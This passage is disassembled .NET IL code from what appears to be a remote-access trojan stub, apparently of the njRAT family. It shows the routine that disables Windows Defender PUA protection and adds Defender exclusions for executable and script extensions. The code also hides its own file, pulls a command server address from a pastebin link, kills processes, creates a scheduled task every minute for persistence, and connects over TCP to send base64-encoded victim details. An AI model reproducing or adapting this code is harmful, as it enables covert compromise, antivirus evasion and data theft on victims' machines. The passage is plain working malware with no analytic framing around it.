                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_02d4:  pop
      IL_02d5:  ldc.i4.1
      IL_02d6:  newarr     [mscorlib]System.String
      IL_02db:  dup
      IL_02dc:  ldc.i4.0
      IL_02dd:  ldstr      "cmd /c powershell Set-MpPreference -PUAProtection "
      + "disable"
      IL_02e2:  stelem.ref
      IL_02e3:  call       string [mscorlib]System.String::Concat(string[])
      IL_02e8:  ldc.i4.0
      IL_02e9:  ldc.i4.1
      IL_02ea:  ldc.i4     0x1388
      IL_02ef:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_02f4:  pop
      IL_02f5:  ldc.i4.1
      IL_02f6:  newarr     [mscorlib]System.String
      IL_02fb:  dup
      IL_02fc:  ldc.i4.0
      IL_02fd:  ldstr      "cmd /c powershell Add-MpPreference -ExclusionExten"
      + "sion\".exe\""
      IL_0302:  stelem.ref
      IL_0303:  call       string [mscorlib]System.String::Concat(string[])
      IL_0308:  ldc.i4.0
      IL_0309:  ldc.i4.1
      IL_030a:  ldc.i4     0x1388
      IL_030f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0314:  pop
      IL_0315:  ldc.i4.1
      IL_0316:  newarr     [mscorlib]System.String
      IL_031b:  dup
      IL_031c:  ldc.i4.0
      IL_031d:  ldstr      "cmd /c powershell Add-MpPreference -ExclusionExten"
      + "sion\".scr\""
      IL_0322:  stelem.ref
      IL_0323:  call       string [mscorlib]System.String::Concat(string[])
      IL_0328:  ldc.i4.0
      IL_0329:  ldc.i4.1
      IL_032a:  ldc.i4     0x1388
      IL_032f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0334:  pop
      IL_0335:  ldc.i4.1
      IL_0336:  newarr     [mscorlib]System.String
      IL_033b:  dup
      IL_033c:  ldc.i4.0
      IL_033d:  ldstr      "cmd /c powershell Add-MpPreference -ExclusionExten"
      + "sion\".com\""
      IL_0342:  stelem.ref
      IL_0343:  call       string [mscorlib]System.String::Concat(string[])
      IL_0348:  ldc.i4.0
      IL_0349:  ldc.i4.1
      IL_034a:  ldc.i4     0x1388
      IL_034f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0354:  pop
      IL_0355:  ldc.i4.1
      IL_0356:  newarr     [mscorlib]System.String
      IL_035b:  dup
      IL_035c:  ldc.i4.0
      IL_035d:  ldstr      "cmd /c powershell Add-MpPreference -ExclusionExten"
      + "sion\".pif\""
      IL_0362:  stelem.ref
      IL_0363:  call       string [mscorlib]System.String::Concat(string[])
      IL_0368:  ldc.i4.0
      IL_0369:  ldc.i4.1
      IL_036a:  ldc.i4     0x1388
      IL_036f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0374:  pop
      IL_0375:  ldc.i4.1
      IL_0376:  newarr     [mscorlib]System.String
      IL_037b:  dup
      IL_037c:  ldc.i4.0
      IL_037d:  ldstr      "cmd /c powershell Add-MpPreference -ExclusionExten"
      + "sion\".dos\""
      IL_0382:  stelem.ref
      IL_0383:  call       string [mscorlib]System.String::Concat(string[])
      IL_0388:  ldc.i4.0
      IL_0389:  ldc.i4.1
      IL_038a:  ldc.i4     0x1388
      IL_038f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0394:  pop
      IL_0395:  ldc.i4.1
      IL_0396:  newarr     [mscorlib]System.String
      IL_039b:  dup
      IL_039c:  ldc.i4.0
      IL_039d:  ldstr      "cmd /c powershell Add-MpPreference -ExclusionExten"
      + "sion\".bat\""
      IL_03a2:  stelem.ref
      IL_03a3:  call       string [mscorlib]System.String::Concat(string[])
      IL_03a8:  ldc.i4.0
      IL_03a9:  ldc.i4.1
      IL_03aa:  ldc.i4     0x1388
      IL_03af:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_03b4:  pop
      IL_03b5:  ldc.i4.1
      IL_03b6:  newarr     [mscorlib]System.String
      IL_03bb:  dup
      IL_03bc:  ldc.i4.0
      IL_03bd:  ldstr      "cmd /c powershell Add-MpPreference -ExclusionExten"
      + "sion\".cmd\""
      IL_03c2:  stelem.ref
      IL_03c3:  call       string [mscorlib]System.String::Concat(string[])
      IL_03c8:  ldc.i4.0
      IL_03c9:  ldc.i4.1
      IL_03ca:  ldc.i4     0x1388
      IL_03cf:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_03d4:  pop
      IL_03d5:  leave.s    IL_03e5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03d7:  dup
      IL_03d8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03dd:  stloc.1
      IL_03de:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03e3:  leave.s    IL_03e5

    }  // end handler
    IL_03e5:  ldsfld     bool j.OK::HIDE_ME
    IL_03ea:  box        [mscorlib]System.Boolean
    IL_03ef:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
    IL_03f4:  brfalse.s  IL_043a

    IL_03f6:  ldc.i4.3
    IL_03f7:  newarr     [mscorlib]System.String
    IL_03fc:  dup
    IL_03fd:  ldc.i4.0
    IL_03fe:  ldstr      "attrib +h \""
    IL_0403:  stelem.ref
    IL_0404:  dup
    IL_0405:  ldc.i4.1
    IL_0406:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
    IL_040b:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
    IL_0410:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
    IL_0415:  call       string [mscorlib]System.IO.Path::GetFileName(string)
    IL_041a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_041f:  stelem.ref
    IL_0420:  dup
    IL_0421:  ldc.i4.2
    IL_0422:  ldstr      "\""
    IL_0427:  stelem.ref
    IL_0428:  call       string [mscorlib]System.String::Concat(string[])
    IL_042d:  ldc.i4.0
    IL_042e:  ldc.i4.1
    IL_042f:  ldc.i4     0x1388
    IL_0434:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_0439:  pop
    IL_043a:  ldsfld     bool j.OK::PasteE
    IL_043f:  brfalse    IL_04df

    IL_0444:  ldsfld     string [mscorlib]System.String::Empty
    IL_0449:  stloc.2
    IL_044a:  ldc.i4.0
    IL_044b:  stloc.s    V_4
    IL_044d:  ldc.i4.s   50
    IL_044f:  stloc.s    V_5
    IL_0451:  ldc.i4.0
    IL_0452:  stloc.s    V_6
    IL_0454:  br.s       IL_0488

    IL_0456:  nop
    .try
    {
      IL_0457:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_045c:  ldsfld     string j.OK::PASTEBIN
      IL_0461:  call       instance string [System]System.Net.WebClient::DownloadString(string)
      IL_0466:  stloc.2
      IL_0467:  leave.s    IL_0488

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0469:  dup
      IL_046a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_046f:  stloc.s    V_7
      IL_0471:  ldloc.s    V_6
      IL_0473:  ldc.i4.1
      IL_0474:  add.ovf
      IL_0475:  stloc.s    V_6
      IL_0477:  ldc.i4     0x1388
      IL_047c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0481:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0486:  leave.s    IL_0488

    }  // end handler
    IL_0488:  ldloc.2
    IL_0489:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_048e:  brfalse.s  IL_0496

    IL_0490:  ldloc.s    V_6
    IL_0492:  ldloc.s    V_5
    IL_0494:  blt.s      IL_0456

    IL_0496:  ldloc.2
    IL_0497:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_049c:  brtrue.s   IL_04da

    IL_049e:  ldloc.2
    IL_049f:  ldc.i4.1
    IL_04a0:  newarr     [mscorlib]System.Char
    IL_04a5:  dup
    IL_04a6:  ldc.i4.0
    IL_04a7:  ldc.i4.s   58
    IL_04a9:  stelem.i2
    IL_04aa:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
    IL_04af:  stloc.3
    IL_04b0:  ldloc.3
    IL_04b1:  ldlen
    IL_04b2:  conv.i4
    IL_04b3:  ldc.i4.1
    IL_04b4:  sub.ovf
    IL_04b5:  stloc.s    V_8
    IL_04b7:  ldc.i4.0
    IL_04b8:  stloc.s    V_4
    IL_04ba:  br.s       IL_04d2

    IL_04bc:  ldloc.3
    IL_04bd:  ldc.i4.0
    IL_04be:  ldelem.ref
    IL_04bf:  stsfld     string j.OK::H
    IL_04c4:  ldloc.3
    IL_04c5:  ldc.i4.1
    IL_04c6:  ldelem.ref
    IL_04c7:  stsfld     string j.OK::P
    IL_04cc:  ldloc.s    V_4
    IL_04ce:  ldc.i4.1
    IL_04cf:  add.ovf
    IL_04d0:  stloc.s    V_4
    IL_04d2:  ldloc.s    V_4
    IL_04d4:  ldloc.s    V_8
    IL_04d6:  ble.s      IL_04bc

    IL_04d8:  br.s       IL_04df

    IL_04da:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_04df:  ldc.i4.0
    IL_04e0:  stsfld     bool j.OK::Cn
    IL_04e5:  ldc.i4     0x7d0
    IL_04ea:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_04ef:  ldsfld     bool j.OK::KProc
    IL_04f4:  brfalse.s  IL_0512

    IL_04f6:  ldstr      "taskkill /f im "
    IL_04fb:  ldsfld     string j.OK::Proc
    IL_0500:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0505:  ldc.i4.0
    IL_0506:  ldc.i4.1
    IL_0507:  ldc.i4     0x1388
    IL_050c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_0511:  pop
    IL_0512:  ldsfld     bool j.OK::TaskMGR
    IL_0517:  brfalse.s  IL_051e

    IL_0519:  call       void Stub.NoTsk::Start()
    IL_051e:  ldsfld     bool j.OK::Sched
    IL_0523:  brfalse    IL_05b0

    .try
    {
      IL_0528:  ldstr      "schtasks /delete /tn \""
      IL_052d:  ldsfld     string j.OK::SCHEDNAME
      IL_0532:  ldstr      "\" /f"
      IL_0537:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_053c:  ldc.i4.0
      IL_053d:  ldc.i4.1
      IL_053e:  ldc.i4     0x1388
      IL_0543:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0548:  pop
      IL_0549:  ldc.i4.5
      IL_054a:  newarr     [mscorlib]System.String
      IL_054f:  dup
      IL_0550:  ldc.i4.0
      IL_0551:  ldstr      "schtasks /create /sc minute /mo 1 /tn \""
      IL_0556:  stelem.ref
      IL_0557:  dup
      IL_0558:  ldc.i4.1
      IL_0559:  ldsfld     string j.OK::SCHEDNAME
      IL_055e:  stelem.ref
      IL_055f:  dup
      IL_0560:  ldc.i4.2
      IL_0561:  ldstr      "\" /tr "
      IL_0566:  stelem.ref
      IL_0567:  dup
      IL_0568:  ldc.i4.3
      IL_0569:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_056e:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_0573:  stelem.ref
      IL_0574:  dup
      IL_0575:  ldc.i4.4
      IL_0576:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_057b:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_0580:  stelem.ref
      IL_0581:  call       string [mscorlib]System.String::Concat(string[])
      IL_0586:  ldc.i4.0
      IL_0587:  ldc.i4.1
      IL_0588:  ldc.i4     0x1388
      IL_058d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0592:  pop
      IL_0593:  leave.s    IL_05b0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0595:  dup
      IL_0596:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_059b:  stloc.s    V_9
      IL_059d:  ldloc.s    V_9
      IL_059f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_05a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_05a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_05ae:  leave.s    IL_05b0

    }  // end handler
    IL_05b0:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_05b5:  stloc.s    V_10
    IL_05b7:  ldloc.s    V_10
    IL_05b9:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      .try
      {
        IL_05be:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_05c3:  brfalse.s  IL_05f2

        .try
        {
          IL_05c5:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_05ca:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_05cf:  ldnull
          IL_05d0:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_05d5:  leave.s    IL_05f2

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_05d7:  dup
          IL_05d8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_05dd:  stloc.s    V_11
          IL_05df:  ldloc.s    V_11
          IL_05e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_05e6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_05eb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_05f0:  leave.s    IL_05f2

        }  // end handler
        IL_05f2:  nop
        .try
        {
          IL_05f3:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
          IL_05f8:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_05fd:  leave.s    IL_061a

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_05ff:  dup
          IL_0600:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0605:  stloc.s    V_12
          IL_0607:  ldloc.s    V_12
          IL_0609:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_060e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0613:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0618:  leave.s    IL_061a

        }  // end handler
        IL_061a:  leave.s    IL_0637

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_061c:  dup
        IL_061d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0622:  stloc.s    V_13
        IL_0624:  ldloc.s    V_13
        IL_0626:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_062b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0630:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0635:  leave.s    IL_0637

      }  // end handler
      IL_0637:  nop
      .try
      {
        IL_0638:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_063d:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
        IL_0642:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_0647:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_064c:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0651:  ldc.i4     0x32000
        IL_0656:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_065b:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0660:  ldc.i4     0x32000
        IL_0665:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_066a:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_066f:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0674:  ldc.i4     0x2710
        IL_0679:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendTimeout(int32)
        IL_067e:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0683:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0688:  ldc.i4     0x2710
        IL_068d:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveTimeout(int32)
        IL_0692:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0697:  ldsfld     string j.OK::H
        IL_069c:  ldsfld     string j.OK::P
        IL_06a1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_06a6:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_06ab:  ldc.i4.1
        IL_06ac:  stsfld     bool j.OK::Cn
        IL_06b1:  call       string j.OK::inf()
        IL_06b6:  call       bool j.OK::Send(string)
        IL_06bb:  pop
        .try
        {
          IL_06bc:  ldstr      "vn"
          IL_06c1:  ldstr      ""
          IL_06c6:  call       object j.OK::GTV(string,
                                                object)
          IL_06cb:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_06d0:  ldstr      ""
          IL_06d5:  ldc.i4.0
          IL_06d6:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                           object,
                                                                                                                                           bool)
          IL_06db:  brfalse.s  IL_06f7

          IL_06dd:  ldloc.s    V_14
          IL_06df:  ldsflda    string j.OK::VN
          IL_06e4:  call       string j.OK::DEB(string&)
          IL_06e9:  ldstr      "\r\n"
          IL_06ee:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_06f3:  stloc.s    V_14
          IL_06f5:  br.s       IL_0727

          IL_06f7:  ldloc.s    V_14
          IL_06f9:  ldstr      "vn"
          IL_06fe:  ldstr      ""
          IL_0703:  call       object j.OK::GTV(string,
                                                object)
          IL_0708:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_070d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_0712:  stloc.s    V_15
          IL_0714:  ldloca.s   V_15
          IL_0716:  call       string j.OK::DEB(string&)
          IL_071b:  ldstr      "\r\n"
          IL_0720:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0725:  stloc.s    V_14
          IL_0727:  ldc.i4.s   16
          IL_0729:  newarr     [mscorlib]System.String
          IL_072e:  dup
          IL_072f:  ldc.i4.0
          IL_0730:  ldloc.s    V_14
          IL_0732:  stelem.ref
          IL_0733:  dup
          IL_0734:  ldc.i4.1
          IL_0735:  ldsfld     string j.OK::H
          IL_073a:  stelem.ref
          IL_073b:  dup
          IL_073c:  ldc.i4.2
          IL_073d:  ldstr      ":"
          IL_0742:  stelem.ref
          IL_0743:  dup
          IL_0744:  ldc.i4.3
          IL_0745:  ldsfld     string j.OK::P
          IL_074a:  stelem.ref
          IL_074b:  dup
          IL_074c:  ldc.i4.4
          IL_074d:  ldstr      "\r\n"
          IL_0752:  stelem.ref
          IL_0753:  dup
          IL_0754:  ldc.i4.5
          IL_0755:  ldsfld     string j.OK::DR
          IL_075a:  stelem.ref
          IL_075b:  dup
          IL_075c:  ldc.i4.6
          IL_075d:  ldstr      "\r\n"
          IL_0762:  stelem.ref
          IL_0763:  dup
          IL_0764:  ldc.i4.7
          IL_0765:  ldsfld     string j.OK::EXE
          IL_076a:  stelem.ref
          IL_076b:  dup
          IL_076c:  ldc.i4.8
          IL_076d:  ldstr      "\r\n"
          IL_0772:  stelem.ref
          IL_0773:  dup
          IL_0774:  ldc.i4.s   9
          IL_0776:  ldsfld     bool j.OK::Idr
          IL_077b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0780:  stelem.ref
          IL_0781:  dup
          IL_0782:  ldc.i4.s   10
          IL_0784:  ldstr      "\r\n"
          IL_0789:  stelem.ref
          IL_078a:  dup
          IL_078b:  ldc.i4.s   11
          IL_078d:  ldsfld     bool j.OK::IsF
          IL_0792:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0797:  stelem.ref
          IL_0798:  dup
          IL_0799:  ldc.i4.s   12
          IL_079b:  ldstr      "\r\n"
          IL_07a0:  stelem.ref
          IL_07a1:  dup
          IL_07a2:  ldc.i4.s   13
          IL_07a4:  ldsfld     bool j.OK::Isu
          IL_07a9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_07ae:  stelem.ref
          IL_07af:  dup
          IL_07b0:  ldc.i4.s   14
          IL_07b2:  ldstr      "\r\n"
          IL_07b7:  stelem.ref
          IL_07b8:  dup
          IL_07b9:  ldc.i4.s   15
          IL_07bb:  ldsfld     bool j.OK::BD
          IL_07c0:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_07c5:  stelem.ref
          IL_07c6:  call       string [mscorlib]System.String::Concat(string[])
          IL_07cb:  stloc.s    V_14
          IL_07cd:  ldstr      "inf"
          IL_07d2:  ldsfld     string j.OK::Y
          IL_07d7:  ldloca.s   V_14
          IL_07d9:  call       string j.OK::ENB(string&)
          IL_07de:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_07e3:  call       bool j.OK::Send(string)
          IL_07e8:  pop
          IL_07e9:  leave.s    IL_0806

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_07eb:  dup
          IL_07ec:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_07f1:  stloc.s    V_16
          IL_07f3:  ldloc.s    V_16
          IL_07f5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_07fa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_07ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0804:  leave.s    IL_0806

        }  // end handler
        IL_0806:  leave.s    IL_0831

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0808:  dup
        IL_0809:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_080e:  stloc.s    V_17
        IL_0810:  ldloc.s    V_17
        IL_0812:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0817:  ldc.i4.0
        IL_0818:  stsfld     bool j.OK::Cn
        IL_081d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0822:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0827:  leave.s    IL_0831

      }  // end handler
    }  // end .try
    finally
    {
      IL_0829:  ldloc.s    V_10
      IL_082b:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_0830:  endfinally
    }  // end handler
    IL_0831:  ldsfld     bool j.OK::Cn
    IL_0836:  ret
  } // end of method OK::connect

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (uint8[] V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldind.ref
    IL_0002:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0007:  stloc.0
    IL_0008:  ldloca.s   V_0
    IL_000a:  call       string j.OK::BS(uint8[]&)
    IL_000f:  ret
  } // end of method OK::DEB

  .method public static void  DLV(string n) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  ldc.i4.1
      IL_001f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0024:  ldarg.0
      IL_0025:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002a:  leave.s    IL_0045

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002c:  dup
      IL_002d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0032:  stloc.0
      IL_0033:  ldloc.0
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0039:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0043:  leave.s    IL_0045

    }  // end handler
    IL_0045:  ret
  } // end of method OK::DLV

  .method public static void  ED() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldc.i4.0
    IL_0001:  call       void j.OK::pr(int32)
    IL_0006:  ret
  } // end of method OK::ED

  .method public static string  ENB(string& s) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       uint8[] j.OK::SB(string&)
    IL_0006:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000b:  ret
  } // end of method OK::ENB

  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
